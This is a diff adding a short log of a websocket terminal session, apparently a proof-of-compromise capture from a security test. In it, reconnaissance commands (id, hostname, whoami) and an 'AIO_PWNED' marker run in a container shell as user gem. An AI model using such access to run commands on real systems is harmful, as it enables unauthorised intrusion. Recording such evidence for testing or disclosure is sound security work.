@@ -1,0 +1,4 @@
+[2026-11-21T20:15:29.360882+00:00] session_id=0dae6190-f927-4961-a8ec-e89d40332321
+[+] websocket connected
+---- RAW ----
+{"type": "output", "data": "\r\u001b[Kgem@12feb02d2ef5:~$ "}{"type": "output", "data": "id; hostname; whoami; echo AIO_PWNED_$(id -u)_$(hostname)\r\n\u001b[?2004l\r"}{"type": "output", "data": "uid=1000(gem) gid=1000(gem) groups=1000(gem)\r\n"}{"type": "output", "data": "12feb02d2ef5\r\n"}{"type": "output", "data": "gem\r\n"}{"type": "output", "data": "AIO_PWNED_1000_12feb02d2ef5\r\n"}
